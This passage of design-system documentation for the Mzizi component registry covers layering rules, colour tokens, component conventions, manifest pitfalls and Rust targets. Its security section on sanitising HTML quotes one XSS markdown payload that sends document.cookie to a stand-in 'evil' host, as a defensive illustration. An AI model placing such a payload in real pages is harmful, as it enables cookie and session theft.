**The six strands** (`documentation-architecture-strands/*`): the **engineering** backbone carries `core-guarantee` (accessibility, data, resilience, observability, safety, primitives — the fixed contract), `shipped` (brand, pages, shell), `swappable` (tokens, icons, framework — the fork seams), and `spine` (the harness); the **meaning** backbone carries `genetic-code` (Ubuntu + Bundu conventions) and `transcription` (doctrine as queryable documents).

**Rules:**

- Nodes consume from the strand below them on the same backbone — never sideways or upward; rungs bridge both backbones and are never imported by nodes
- Each component is a standalone file
- N6 pages NEVER hardcode buttons/cards/SVGs — pure composition of N2/N3
- N1 is the only layer allowed to define a design **value** — every other layer consumes it (via `var()` on the web, via the generated token file on Swift / Kotlin / ArkTS / Rust). "CSS values" was the web-only phrasing of this rule; the rule is target-agnostic, the syntax is not
- N3 always destructures `{ log, motion, LiveRegion }` from `useNyuchiHarness`; N2 never imports it
- All colors and styles come from CSS custom properties in `globals.css`
- This application DNA helix is **distinct** from the data architecture at `/architecture`. Never conflate the two.

### 6.3 Component Patterns

All UI components in `components/ui/` follow these patterns:

**CVA variant pattern** (example: `button.tsx`):

```typescript
const buttonVariants = cva(
  "inline-flex items-center justify-center ...", // base classes
  {
    variants: {
      variant: {
        default: "bg-primary text-primary-foreground ...",
        outline: "border-border bg-input/30 ...",
      },
      size: {
        default: "h-9 gap-1.5 px-3",
        sm: "h-8 gap-1 px-3",
      },
    },
    defaultVariants: { variant: "default", size: "default" },
  }
)
```

**Polymorphic rendering with Slot:**

```typescript
function Button({ asChild = false, ...props }) {
  const Comp = asChild ? Slot.Root : "button"
  return <Comp data-slot="button" className={cn(buttonVariants({ variant, size, className }))} {...props} />
}
```

**Data attributes for component identification:**

- `data-slot="button"` — component identification
- `data-variant={variant}` — active variant
- `data-size={size}` — active size

**Server vs Client components:**

- Components are React Server Components by default
- Add `"use client"` only when the component uses hooks, event handlers, or browser APIs
- The `ThemeProvider` and interactive components require `"use client"`

### 6.4 Error Handling

Three layers of error isolation:

1. **Component-level:** Try/catch in data processing, graceful fallbacks
2. **Route-level:** `app/error.tsx` catches route errors; `components/section-error-boundary.tsx` isolates failures per landing-page section
3. **Global:** `app/global-error.tsx` as last resort

**API error handling:**

- API routes return proper HTTP status codes (400, 404, 500, 503 when Supabase env vars are missing)
- All errors logged via `createLogger("<scope>")` from `lib/observability.ts`, with `[mzizi]` prefix for grep-ability
- Resilience patterns (circuit-breaker, retry, timeout, fallback-chain, ai-safety, chaos) are vendored in `lib/`; their canonical source lives in the Supabase `components` table as `registry:lib` items and is installed by consumer apps via the shadcn CLI

---

## 7. Colour System — Seven Minerals, Seven Heritage, Status & Experimental

This is the canonical design system. All bundu ecosystem apps MUST use these tokens.

The palette layers four families:

1. **Seven minerals** — the brand accents, each carrying a semantic **role**, grouped in two **families** (`deep-earth`, `hand`).
2. **Seven heritage** — atmospheric anchors for surfaces, moods and mini-app theming (no role/family).
3. **Status** — semantic state colours (success/warning/info/error/neutral/offline/syncing), separate from the brand accent.
4. **The Experimental Seven** — a computed proving-ground palette (candidate accents + data series).

Minerals + heritage are **DB-generated**: `pnpm tokens:sync` projects the Supabase collections `styling-minerals` and `styling-heritage-colors` into `lib/tokens/palette.generated.ts` and the `tokens:generated` block of `app/globals.css`; `pnpm tokens:verify` is the CI drift gate. The live, theme-adaptive values render at `/tokens`. **Never hand-edit `palette.generated.ts` or the generated globals.css block** — edit the DB collection and re-sync.

### 7.1 Color Palette

**Seven minerals** — brand accents, each with a role + family (sourced from `styling-minerals`; hexes shown are the current dark/light snapshot — `/tokens` is the live source):

| Mineral    | Role         | Family     | Dark      | Light     | CSS Variable         |
| ---------- | ------------ | ---------- | --------- | --------- | -------------------- |
| Cobalt     | Knowledge    | deep-earth | `#00B0FF` | `#0047AB` | `--color-cobalt`     |
| Tanzanite  | Identity     | deep-earth | `#B388FF` | `#4B0082` | `--color-tanzanite`  |
| Malachite  | Growth       | deep-earth | `#64FFDA` | `#004D40` | `--color-malachite`  |
| Sodalite   | Intelligence | deep-earth | `#3D5AFE` | `#283593` | `--color-sodalite`   |
| Gold       | Value        | hand       | `#FFD740` | `#5D4037` | `--color-gold`       |
| Terracotta | Community    | hand       | `#E1B07E` | `#A0522D` | `--color-terracotta` |
| Copper     | Stewardship  | hand       | `#FF8A65` | `#BF5A36` | `--color-copper`     |

**Per-brand accent.** Colour is a role contract, not decoration. The operating brand picks its accent via `--brand-accent`: **nyuchi** (this portal) = **gold**, **mukoko** = **tanzanite** (Identity), **bundu** = its own. Never hardcode a brand's accent hex — consume `--brand-accent`.

**Seven heritage** — atmospheric tones (sourced from `styling-heritage-colors`; no role/family):

| Heritage | Dark      | Light     | CSS Variable       |
| -------- | --------- | --------- | ------------------ |
| Indigo   | `#7986CB` | `#4527A0` | `--color-indigo`   |
| Savanna  | `#E5C158` | `#8D6E1A` | `--color-savanna`  |
| Baobab   | `#A1887F` | `#4E342E` | `--color-baobab`   |
| Sunset   | `#FF7043` | `#D84315` | `--color-sunset`   |
| River    | `#4DD0E1` | `#006064` | `--color-river`    |
| Hematite | `#90A4AE` | `#546E7A` | `--color-hematite` |
| Kalahari | `#E8D9B5` | `#C9B589` | `--color-kalahari` |

**Status** — semantic state tokens (values in `app/globals.css` `:root`/`.dark`; `error` maps to `--destructive`): `--success`, `--warning`, `--info`, `--destructive` (error), `--neutral`, `--offline`, `--syncing`.

**The Experimental Seven** — computed, not chosen. Seven maximally-separated hues on a heptagon offset by the founding prime (17°), prime saturations, and every foreground solved to a ≥7:1 (P7) contrast floor. Names: **ember, acacia, fern, lagoon, storm, dusk, protea**. Each ships four computed tiers — text (`--exp-<name>`), UI accent (`--exp-<name>-ui`), and container / on-container (`--exp-<name>-container` / `--exp-<name>-on`) — with `--color-<name>` mapping to the text tier via `@theme`. Provenance: the bundu newsroom, "Colours Computed, Not Chosen" (`styling-experimental`, doctrine 4.2.0). Currently a **hand-authored** block in `globals.css` (not yet wired into `tokens:sync`); the proving ground for data series + candidate accents.

**Surface / semantic tokens** (theme-adaptive via CSS custom properties):

> **Values synced from the `nyuchi-tokens` registry (N1), April 2026 AAA-optimised swap.**
> Surfaces were re-arranged: `background` is now the ambient page base, `card` is the content surface, `muted` is the deepest fill. Border/input alpha tightened to 0.06. Two new tokens added: `overlay` (modal/sheet surface) and `scrim` (modal backdrop).

| Token                  | Light                     | Dark                       | Usage                         |
| ---------------------- | ------------------------- | -------------------------- | ----------------------------- |
| `--background`         | `#F3F2EE`                 | `#1B1A17`                  | Ambient page base (L10% dark) |
| `--foreground`         | `#141413`                 | `#F5F5F4`                  | Primary text                  |
| `--card`               | `#FFFFFF`                 | `#100F0E`                  | Content surface (L6% dark)    |
| `--muted`              | `#FAF9F5`                 | `#050504`                  | Deepest fill (L2% dark)       |
| `--muted-foreground`   | `#494840`                 | `#B2AFA8`                  | Secondary text (AAA)          |
| `--pitch`              | `#FAFAFA`                 | `#050505`                  | Highest surface (P2)          |
| `--void`               | `#F8F8F7`                 | `#080807`                  | Near-highest surface (P3)     |
| `--surface`            | `#EEEEEC`                 | `#131211`                  | Content surface rung (P7)     |
| `--container`          | `#E5E4E1`                 | `#1E1D1A`                  | Container rung (P11)          |
| `--overlay`            | `#E0DFDC`                 | `#23221F`                  | Modal / sheet surface (P13)   |
| `--raised`             | `#D6D5D1`                 | `#2E2C29`                  | Raised rung (P17)             |
| `--wash`               | `mix(surface, accent 7%)` | `mix(surface, accent 12%)` | Cover-colour page wash        |
| `--scrim`              | `rgba(0,0,0,0.40)`        | `rgba(0,0,0,0.60)`         | Modal backdrop                |
| `--border`             | `rgba(10,10,10,0.06)`     | `rgba(255,255,255,0.06)`   | Borders                       |
| `--primary`            | `#141413`                 | `#F5F5F4`                  | Primary interactive           |
| `--primary-foreground` | `#FFFFFF`                 | `#1B1A17`                  | Text on `--primary`           |
| `--destructive`        | `#B3261E`                 | `#F2B8B5`                  | Error / danger                |

**Chart colors** (theme-adaptive):

| Token       | Light     | Dark                   |
| ----------- | --------- | ---------------------- |
| `--chart-1` | `#4B0082` | `#B388FF` (Tanzanite)  |
| `--chart-2` | `#0047AB` | `#00B0FF` (Cobalt)     |
| `--chart-3` | `#004D40` | `#64FFDA` (Malachite)  |
| `--chart-4` | `#5D4037` | `#FFD740` (Gold)       |
| `--chart-5` | `#8B4513` | `#D4A574` (Terracotta) |

**Category-to-mineral mapping** (for apps with activity categories):

| Category | Mineral    | Tailwind classes                                   |
| -------- | ---------- | -------------------------------------------------- |
| Farming  | Malachite  | `bg-mineral-malachite`, `text-mineral-malachite`   |
| Mining   | Terracotta | `bg-mineral-terracotta`, `text-mineral-terracotta` |
| Travel   | Cobalt     | `bg-mineral-cobalt`, `text-mineral-cobalt`         |
| Tourism  | Tanzanite  | `bg-mineral-tanzanite`, `text-mineral-tanzanite`   |
| Sports   | Gold       | `bg-mineral-gold`, `text-mineral-gold`             |

### 7.2 Typography

| Role             | Font           | CSS Variable   | Usage                    |
| ---------------- | -------------- | -------------- | ------------------------ |
| Body             | Noto Sans      | `--font-sans`  | All body text, UI labels |
| Display/Headings | Noto Serif     | `--font-serif` | Page titles, hero text   |
| Code             | JetBrains Mono | `--font-mono`  | Code blocks, terminal    |

Noto Sans chosen for broad language support (African languages, diacritics).

All brand wordmarks are **lowercase**: `mzizi`, `mukoko`, `nyuchi`, `shamwari`, `bundu`.

### 7.3 Theme Implementation

- `next-themes` with `attribute="class"` and `defaultTheme="system"`
- CSS custom properties defined in `app/globals.css` under `:root` (light) and `.dark` (dark)
- Tailwind CSS 4 `@theme inline` block registers all tokens for utility class generation
- `@custom-variant dark (&:is(.dark *))` enables dark mode variant

### 7.4 Styling Rules

1. **NEVER use hardcoded hex colors, rgba(), or inline `style={{}}`** — use Tailwind classes backed by CSS custom properties
2. All new color tokens MUST be added to `globals.css` in both `:root` and `.dark` blocks AND registered in the `@theme` block
3. Use `cn()` from `@/lib/utils` for all className composition — never string concatenation
4. Use `CATEGORY_STYLES` objects for category-specific styling — never construct dynamic Tailwind class names
5. Border radius uses the `--radius` token system (`radius-sm` through `radius-4xl`)

**Exceptions to the no-inline-styles rule:**

- `next/og` (Satori) routes — canvas renderer, no CSS custom property support
- Three.js/WebGL — requires raw hex for materials and shaders
- SVG components where Tailwind classes don't apply

### 7.5 Radius System

All radii derive from `--radius-unit: 7px`. The ecosystem numbers are 7, 12, 14, 17.

```
--radius-unit: 7px
--radius-sm:  7px   (1× unit)   — checkboxes, small elements
--radius-md:  12px  (unit + 5)  — cards, inputs, containers
--radius-lg:  14px  (2× unit)   — default, medium containers
--radius-xl:  17px  (unit + 10) — large cards, dialogs, prominent surfaces
--radius-full: 9999px           — buttons, badges, pills, avatars
```

**Buttons are always pill-shaped (`rounded-full`).** This is an executive brand identity decision — not a radius scale value. All buttons, tabs, and interactive pill-shaped controls use `rounded-full` (9999px). This applies across the entire ecosystem.

### 7.6 Media Aspect — the main image is square

**The main image on a detail page is SQUARE, everywhere in the ecosystem.** Events, listings, products, places, profiles — one shape, so a detail page is recognisable as a detail page before a single word is read.

The ratio is an N1 token, not a class someone picks per component:

```
--aspect-media: 1 / 1          → aspect-[var(--aspect-media,1/1)]        (the default)
--aspect-media-wide: 16 / 9    → aspect-[var(--aspect-media-wide,16/9)]  (INTRINSICALLY 16:9 only)
--aspect-media-portrait: 4 / 5 → aspect-[var(--aspect-media-portrait,4/5)]
```

**Components reference the token with an inline fallback, never a bare `aspect-media`.** A bare utility only exists where `--aspect-media` has been defined in that app's `@theme`, and **nothing distributes it**: there is no registry item carrying the CSS custom properties (`token-row` is a data-display primitive, not the token source), and consumer apps take their tokens from `@bundu/ui`, not from this repo's `globals.css`. A consumer installing `nyuchi-listing-card` would have got an unknown utility and therefore **no aspect ratio at all** — the card collapsing to its content height, silently, in someone else's app. The `var()` fallback keeps the decision as data (redefine the property and every surface retunes) while staying independently installable, which §15.6 requires.

**Why this is a token and not a convention.** Before it, every component chose its own and they disagreed — `nyuchi-article-card` and `nyuchi-listing-card` at 16:9, `nyuchi-offer-card` square, `nyuchi-place-card` custom, and `nyuchi-cover-wash-header` — the detail-page hero itself — with **no aspect constraint at all**. "The main image" therefore meant a different shape on every surface, and nothing in the system could catch it, because none of them were wrong against any stated rule. N1's covenant is that design decisions are data; a ratio is a design decision.

**`aspect-media-wide` is not a free choice.** It is for media that is intrinsically 16:9 — a video frame in `media-player-page` — where forcing square would letterbox or crop the content itself. Reaching for it because a layout looks better wide is exactly how the drift started. If you are tempted, the answer is square.

**The detail-page pattern is invariant even where the ratio is not.** Every detail surface composes in this order, and a new one does not get to invent its own:

```
square hero (cover wash) → title → host/owner row → meta tiles (when · where · …)
  → action card (CTA + state) → rich body → supporting sections → footer identity
```

Only the hero's ratio varies, and only for intrinsically-wide media. The order, the meta-tile treatment, and the action-card-above-the-body sequence do not vary at all.

---

## 8. Conventions

### 8.1 Code Style

- **Path alias:** `@/*` maps to project root (e.g., `import { cn } from "@/lib/utils"`)
- **shadcn style:** "new-york" with neutral base color
- **Tailwind utility classes only** — no inline styles, no CSS modules (except embed widgets)
- **TypeScript strict mode** — maintain type safety, no `any` without justification
- **Exports:** Named exports for components, not default exports
- **File naming:** kebab-case for files, PascalCase for components

### 8.2 Component Requirements

Every component in `components/ui/` MUST have:

1. **Control density** — the scale is dense by default: `h-8` (32px) small, `h-9` (36px) default, `h-10` (40px) large. **56px (`h-14`) is reserved for specific prominent surfaces — hero CTAs and the like — not the default.** An earlier revision of this file said 56px default / 48px minimum and called it non-negotiable; the shipped primitives never did that, so the doctrine was describing a system that did not exist. Density won.

   Because the default sits below the 44pt (Apple HIG) and 48dp (Material) touch-target guidance, a dense control that is a **touch** target on mobile must earn its hit area some other way — surrounding spacing, or padding the interactive area beyond the visual box. Density is a deliberate choice, not a licence to ship a 32px tap target with nothing around it.

2. **Accessibility** — ARIA attributes where needed, semantic HTML, keyboard navigation via Radix primitives
3. **Global styles only** — Tailwind classes backed by CSS custom properties from `globals.css`
4. **`cn()` composition** — all className props composed through `cn()`
5. **CVA variants** — use class-variance-authority for any component with visual variants
6. **Radix primitives** — use Radix UI for accessible behavior (focus management, keyboard nav, screen readers)
7. **`data-slot` attribute** — for component identification in CSS selectors

### 8.3 Adding a New Component

**Component source lives on disk, in git.** Every component is a file under
`components/registry/n<N>-<label>/<name>.<ext>`, across N1–N11. Source is
_not_ authored in Supabase any more; see `docs/component-source-migration.md` for why.
Everything _around_ a component still lives in `component_documents`: description,
dependencies, `registryDependencies`, `files[]`, node, collection, owner, status, version
history, changelog and docs. Only the bytes moved.

1. Write the file under `components/registry/n<N>-<label>/`, following the CVA + Radix +
   `cn()` pattern (see `button.tsx`)
2. Add its item to `registry.json` — `name`, `type`, `description`, `dependencies`,
   `registryDependencies`, and `files[].path` (where the shadcn CLI places it in a
   **consumer's** project, which is free to differ from where it lives here)
3. Add its `meta` block in the same item — `useCases`, `variants`, `sizes`, `features`,
   `a11y`, `owner`, `collection`. This is the component's documented contract and the
   manifest is its only home; there is no database row to put it in
4. `pnpm typecheck && pnpm lint && pnpm test` — the whole point of the file being on disk
5. `pnpm registry:normalize` to canonicalise the manifest, then `pnpm registry:validate`
   to prove the item resolves on disk and its dependencies are addressable
6. Verify the API serves it: `curl http://localhost:11736/api/v1/ui/<component-name>`
7. Commit both — CI runs `registry:verify` + `registry:validate`

### 8.4 Modifying Existing Components

- **Edit the file on disk.** There is no `source_code` column to edit any more, and no
  sync in either direction — one copy, in git, where the toolchain can see it
- Preserve the existing CVA variant pattern — add variants, don't restructure
- Keep Radix UI accessibility primitives intact
- Don't break the shadcn registry schema — `https://ui.shadcn.com/schema/registry.json`
- Update the item's `meta` in `registry.json` when the change alters the contract — a new
  variant that no `meta.variants` entry names is a component whose documentation is already
  wrong
- Append to `component_versions` so the changelog API reflects the change
- Re-run `pnpm registry:normalize` and `pnpm registry:validate`, and commit the manifest

### 8.4.1 N1 token artifacts are generated — never hand-written

`components/registry/n1-tokens/nyuchi-tokens-<platform>.<ext>` (swift, kotlin, arkts,
react-native, python, rust) and `lib/tokens/palette.generated.ts` are all written by
`pnpm tokens:sync` from the Supabase collections `styling-minerals` and
`styling-heritage-colors`. `pnpm tokens:verify` fails the build on any drift, and treats a
**missing** file as drift.

Edit the DB collection and re-sync. Do not hand-edit these files, and do not re-add
per-platform generators to `nyuchi-tokens.ts` — that file's `generateTokens` covers `css`
and `json` only, because those span the whole token system (semantic tokens, brand
overrides, listing themes) rather than just the palette. The platform generators that used
to live there carried their own hardcoded five-mineral colour map and were the reason the
token node shipped a five-and-five palette against a seven-and-seven system.

### 8.4.2 A component that renders HTML sanitises it — the caller is not the boundary

Registry components are installed into **other people's apps**, so a component that writes
a prop into the DOM is the last place anyone can enforce anything. Four shipped with no
sanitising at all, and the security review that found them was only possible once source
was on disk — nothing could open a component while it lived in a JSON column.

The rules, each of them a defect that actually shipped:

1. **Anything reaching `dangerouslySetInnerHTML` or `innerHTML` is sanitised in the
   component**, through DOMPurify with an explicit `ALLOWED_TAGS` / `ALLOWED_ATTR`
   allow-list and an `ALLOWED_URI_REGEXP`. `chapter-reader`, `nyuchi-media` and
   `rich-text-editor` injected a `content` / `value` prop raw. A chapter body, an article
   body and a controlled editor value are externally authored by construction — if the
   consumer had written them, they would not need the component to render them.
2. **A URL going into an `href` is scheme-checked against an allow-list**, never a
   deny-list. `markdown-renderer` escaped the quote so its `href` attribute could not be
   broken out of, and that is not enough: `javascript:` needs no quote and no parenthesis
   —`[x](javascript:location='https://evil/'+document.cookie)`. A deny-list has to
   anticipate `vbscript:`, `data:`, and whatever comes next.
3. **A refused URL keeps its link text.** Dropping the whole link silently deletes
   content; the href is the dangerous part, the text is not.
4. **Escape on EVERY branch, not most of them.** `markdown-renderer` ran headings,
   paragraphs, list items, blockquotes and code blocks through `escapeHtml` and table
   cells through nothing. Partial escaping reads as escaping. When you add a branch that
   emits HTML, the question is which existing branch you copied and whether you copied its
   escaping too.
5. **Never `href="javascript:..."`, even for something inert like `history.back()`.** Any
   CSP without `unsafe-inline` blocks it, so the control renders and does nothing in
   exactly the apps careful enough to have a CSP — and it announces to a screen reader as
   a link with no destination. It is a `<button onClick>`.

### 8.4.3 The manifest is an install contract — two ways it silently breaks

Both of these leave every gate green (typecheck, lint, tests, build) while `npx shadcn add`
fails in someone else's project, which is why `pnpm registry:validate` checks them:

- **`registryDependencies` is a bare name ONLY for components that exist upstream at
  ui.shadcn.com.** The CLI resolves a bare name against the default registry; anything
  Mzizi-only needs the absolute `https://mzizi.dev/api/v1/ui/<name>` form. 85 entries
  across 58 components were bare names for Mzizi-only components.
- **Every npm package a component imports appears in its `dependencies`.** 22 did not.
  A Deno specifier like `jsr:@supabase/...` is not an npm package and cannot go there at
  all — a component that needs one is not installable via the CLI, and its description
  should say so.

### 8.5 When Building a New Bundu Ecosystem App

Install components via the shadcn CLI directly against the registry:

```bash
npx shadcn@latest add https://mzizi.dev/api/v1/ui/button
npx shadcn@latest add https://mzizi.dev/api/v1/ui/card
```

Every new app inherits the canonical typography (Noto Sans / Noto Serif / JetBrains Mono), the Seven African Minerals palette, the layered architecture, the pill-button identity, and the dense control scale (§8.2). Mzizi's own long-form docs belong in this repo as MDX (§15.17). Mzizi tooling (MCP, SDK, skills, console mini-app) is consumed from `nyuchi/mzizi-tools` as published npm packages.

### 8.6 Distribution surface

Two live distribution paths from this repo:

```bash
# 1. shadcn CLI — components from the registry
npx shadcn@latest add https://mzizi.dev/api/v1/ui/<component>

# 2. Direct HTTP — raw payloads for any consumer
GET https://mzizi.dev/api/v1/ui            # list
GET https://mzizi.dev/api/v1/ui/{name}     # source + metadata
GET https://mzizi.dev/api/v1/skills        # list
GET https://mzizi.dev/api/v1/skills/{name} # full MDX body
```

Mzizi tooling (CLI, agent, MCP transport, skills bundle, console mini-app) is published from `nyuchi/mzizi-tools` — not from this repo. The MCP server at `mzizi.dev/mcp` is the canonical reference implementation; the `mzizi-mcp` worker in `mzizi-tools` mirrors it for consumers that want a self-hostable Cloudflare Worker copy.

### 8.7 Vendored brand stack — path + naming drift

The portal dogfoods its own registry. The transitive closure of the brand components (`nyuchi-header`, `nyuchi-footer`, `nyuchi-user-menu`) is vendored into this repo under `components/mukoko/*` and `components/layout/*`.

**Two divergences between the registry's declared paths and the portal's reality**:

1. **`components/mukoko/*` paths, `nyuchi-*` item names.** The registry is mid-rename; vendored files keep the `components/mukoko/*` path. When the registry itself completes the rename to `components/nyuchi/*`, update the `files[].path` entries in `registry.json` + rename locally in a single commit.
2. **Brand component imports use `@/components/brand/*` paths** that don't exist in this repo. The portal keeps `nyuchi-logo.tsx` and `mineral-strip.tsx` under `@/components/layout/` instead. Vendored files are patched on install to target the portal's real paths.

**Footer composition note.** `components/landing/footer.tsx` is deliberately NOT a one-line wrapper over `NyuchiFooter`. The portal footer has four portal-specific features: (1) the ecosystem brand grid, (2) a socials row, (3) an inline `ThemeToggle`, (4) a version line.

### 8.8 registry.json Schema Reference

```json
{
  "$schema": "https://ui.shadcn.com/schema/registry.json",
  "name": "mzizi",
  "homepage": "https://mzizi.dev",
  "items": [
    {
      "name": "component-name",
      "type": "registry:ui | registry:hook | registry:lib",
      "description": "One-line description of the component.",
      "dependencies": ["npm-package-names"],
      "registryDependencies": ["other-registry-component-names"],
      "files": [
        {
          "path": "components/ui/component-name.tsx",
          "type": "registry:ui"
        }
      ]
    }
  ]
}
```

**`files[].path` here is CONSUMER-shaped, not repo-shaped, and that is deliberate.**
`"components/ui/button.tsx"` is where the shadcn CLI writes the file in **someone
else's** project. In this repo the same component lives at
`components/registry/n2-primitives/button.tsx`, and `lib/registry.ts` resolves it
by **name + node directory** — never by walking `path`. Two different questions,
two different answers; reading `path` as a repo path is how a "file not found"
gets chased in the wrong tree.

**`target` is the field that would make the destination explicit, and no item
uses it** — 0 of 573. The CLI derives the destination from `type` when `target`
is absent (`registry:ui` → `components/ui/`, `registry:lib` → `lib/`, …), and
because our `path` values already match what that derivation produces, installs
land correctly. So this is **not** a live defect, and it is written down because
it is the kind that becomes one silently: the moment an item needs a destination
the `type` derivation does not produce — anything outside the conventional
directory for its type — `target` is the field to set, and `path` is not a
substitute for it.

Mzizi is **mobile-first**. Next.js/React is still here and still shipping, but the direction is
**Rust across the stack**, with first-class native targets: **Swift** (iOS/macOS), **Kotlin**
(Jetpack Compose), **ArkTS** (HarmonyOS), and **React Native**. Svelte remains production-ready
and supported; it is no longer the destination (see the `tier` table below).

**The consequence, stated plainly: most components are framework-specific.** A `Button` for
SwiftUI and a `Button` for Svelte share a contract and a token set, not a source file. So the
registry serves two different things depending on the target, and `framework_descriptors.readiness`
is the field that says which:

| `readiness`        | What a consumer actually gets                                     |
| ------------------ | ----------------------------------------------------------------- |
| `production`       | Real, installable component source for that framework             |
| `primitives_wired` | Some primitives resolve; the surface is partial                   |
| `metadata_only`    | **Instructions only** — the contract, tokens and rules, no source |

Never present a `metadata_only` target as though components exist for it. Answer with the
contract and the tokens, and say that the source is the consumer's to write.

**`readiness` is not the same question as `tier`, and both are needed.** `readiness` says
whether source EXISTS. `tier` says whether a target is where Mzizi is HEADING:

| `tier`     | Meaning                                                                        |
| ---------- | ------------------------------------------------------------------------------ |
| `primary`  | The direction — Rust: `dioxus`, `crates-io`                                    |
| `native`   | First-class native shells over the shared Rust core — swift, kotlin, arkts, RN |
| `optional` | Supported, not the destination — `svelte`                                      |
| `legacy`   | Still ships, being moved away from — `react`, `mzizi-react-legacy`             |

The two are deliberately independent, because today they point opposite ways: **`svelte` is
`production` + `optional`** (source exists, not the direction) while **`dioxus` is
`metadata_only` + `primary`** (the direction, source not wired). One field would force a false
choice between "has components" and "is the plan", and whichever it answered would mislead.

**Committing to Rust is what demotes Svelte.** Svelte was the web destination while Rust was
core-only; once Dioxus carries web _and_ mobile native from one codebase, Svelte becomes an
alternative rather than the target. It stays production-ready and supported — `optional` is not
deprecated, and `react` at `legacy` still holds the largest inventory by far.

**Rust has started, and exactly how far it has got matters.** This section previously said "no
Rust ships yet"; that is now wrong in one specific place and still right everywhere else, and
conflating the two is the drift it warned about.

**What ships:** a cargo workspace at `mzizi-rs/` with two crates — `mzizi-tokens` (N1, the
generated token module) and `mzizi-ui` (N2, Dioxus primitives). The primitives are files under
`components/registry/n2-primitives/<name>.rs`, beside their `.tsx` siblings, which the crate
`#[path]`-includes. `cargo fmt --check`, `cargo check`, `clippy -D warnings` and `cargo test`
run in CI's `Rust` job, and `Build` needs it.

**N8 and N9 now ship too, and the distinction between what landed and what did not is the
whole of this paragraph.** `mzizi-assurance` (N8) and `mzizi-fundi` (N9) compile a Rust core
for **every** component in those two directories — the probes, the error and alert
aggregation, the a11y and RTL rule engines, the chaos classifier, the incident lifecycle, the
OTLP payload builder and the healing decision engine. Each `.rs` sits beside its `.ts`/`.tsx`
sibling and a contract suite reads that sibling on disk, so the two cannot drift apart
silently.

**What does not ship: a WASM build.** Every core above is pure logic with no I/O, which is what
makes it portable — and nothing compiles it to WASM, no consumer loads it, and no `.ts` calls
into it. The two implementations agree **by contract test, not by sharing a binary**. "N8 is a
Rust node" therefore means its rules have one authoritative home; it does not yet mean one
binary serves every target, and reading it as the latter is the drift this paragraph exists to
prevent.

**Still TypeScript, entirely:** the harness (`lib/harness/index.tsx`), the N5 resilience
primitives (`lib/*.ts`), the N4 safety gates, and the deployed fundi worker in `mzizi-tools`.
Rust statements about **N4 and N5** in `documentation-architecture-nodes` remain **target
state, explicitly labelled** — `rust.state` reads `target`, never `shipping`. A node that
describes a Rust implementation in the present tense reads as shipped to every agent that
queries it.

**The gate landed with the first component, not after it.** A `.rs` file in the registry with
no crate compiling it is exactly what a `source_code` database column was: bytes nothing
verifies. `__tests__/api/v1/rust-route.test.ts` fails if any `.rs` component is not included by
a crate, so there is no window in which Rust ships unchecked.

**`cargo check` is necessary and not sufficient.** Two files can each compile and still be
different buttons — a renamed variant, a missing `data-slot`, a dropped class — and the symptom
is a Dioxus app rendering markup the shared stylesheet does not style, which looks like a CSS
bug in a repo where nothing is wrong. `mzizi-rs/crates/mzizi-ui/tests/contract.rs` reads each
component's `.tsx` on disk and compares. Individual classes are asserted, never the whole
string: Tailwind class order is not semantic, and a character-diff that fails on a reordering
trains everyone to ignore it.

**Do not machine-translate the `.tsx` files.** Write each Rust component against the
component's _contract_ — props, variants, a11y semantics, the `data-slot` names — with the
`.tsx` as reference, not input. A mechanical TSX→RSX pass carries every defect in the original
across while `cargo check` waves it through, because a faithful port of a broken component
still compiles.

**Two different Rusts, and conflating them is the classic error.**

- **Rust as the shared core** — compiled to WASM, it is to be the harness, the N5 resilience
  state machine, and the N4 safety gates (see §6.2). It holds _logic_, not UI, and each target
  keeps its own native shell. This is what lets Swift, Kotlin, ArkTS and React Native stay
  idiomatic while sharing one implementation of the rules.
- **Rust as a UI framework** — **Dioxus** is the sanctioned choice, and the one that answers
  "one Rust framework for web _and_ mobile native": it targets web (WASM), desktop, iOS and
  Android from a single codebase. It matters here specifically because **Dioxus 0.7 ships
  Tailwind and Radix support**, which is Mzizi's exact primitive stack (Tailwind + Radix + CVA)
  — so the primitive surface maps across rather than being re-invented.

`crates-io` in the registry describes the Rust _UI_ ecosystem (Leptos/Dioxus/Yew). It is **not**
where the WASM core lives, and a consumer asking "what Rust does Mzizi have?" must not be handed
the UI descriptor as the answer to a core-logic question.

**What does NOT vary by target: N1.** This is the load-bearing claim of the whole multi-target
model — design decisions are _data_, so one source generates every target's token artifact:
CSS custom properties for web, Swift for iOS/macOS, Kotlin for Compose, ArkTS for HarmonyOS, and
a Rust module for the shared WASM core and Dioxus. Adding a target means adding an **emitter**,
never re-authoring the values. If a target ever needs its own hand-maintained token file, N1 has
failed and the fix is the generator, not the copy.

That is also why N1 sits on the `swappable` strand while carrying an invariant: the token
_pipeline_ is forkable, the token _decisions_ are not.

Also invariant across targets: the dense control scale (§8.2), the pill-button identity, and the
APCA contrast floor. A target that cannot honour those is not a supported target.

**Distribution is per-target, and `npx shadcn` is React-only.** §8.6's shadcn command serves
React. Svelte consumers use `shadcn-svelte`; Dioxus consumes via crates; Swift, Kotlin and ArkTS
have no CLI equivalent at all — which is precisely why they are instruction-first. Do not
document one install command as though it serves every target.

---

## 8.10 Sample data — what previews render against, and where it lives

**Every component preview renders against a curated sample dataset.** `lib/samples/data.ts`
is the source; `lib/samples/types.ts` explains the shapes.

**The shapes mirror the production MongoDB validators field for field** — `SamplePlace` against
`places.places`, `SampleEntity` against `entity.entities`, and so on through persons, events,
products and articles. That correspondence is the whole point and what makes this more than
fixture JSON: a consumer wiring `nyuchi-place-card` to their own `places.places` has the
mapping already done, because the component was built against a document of exactly that
shape. Getting a preview working and getting an integration working stop being two jobs.

**Why curated rather than reading production — measured, not assumed.** `places.places` holds
15,359 documents; **38** have a description and **zero** have `media`. They are bare OSM
name-and-geometry imports. `events.events` holds one document; `commerce.products` holds two.
A place card rendered against production is a grey box with a name, so the choice was never
"curated vs. real", it was "curated vs. nothing". Three reasons it stays curated once
production fills up: mzizi.dev is public and production records are real people and unverified
community reports (`places_public` exists as a view precisely because some fields must not
leave the cluster); a preview that changes when someone edits a row is not a preview; and real
data clusters around the easy case, while a fixture set is chosen to break things.

**One source, two distribution surfaces.**

```
lib/samples/data.ts ──┬─► the app (/playground, /components, /api/v1/samples/*)
                      └─► `pnpm samples:push` ─► MongoDB `mzizi_samples`
```

MongoDB **gets filled**, and it is not the authoring surface. A consumer or an agent points a
real driver at `mzizi_samples` and queries documents in the production shape — that is the
"wiring is already done" property, and an HTTP fixture endpoint would not give it to them. But
the site does NOT query Mongo to render: 1,179 pages prerender from the file, so a Mongo
outage can never empty the playground. Pushing derives Mongo from git and never the reverse;
edit a document in `mzizi_samples` directly and the next push overwrites it.

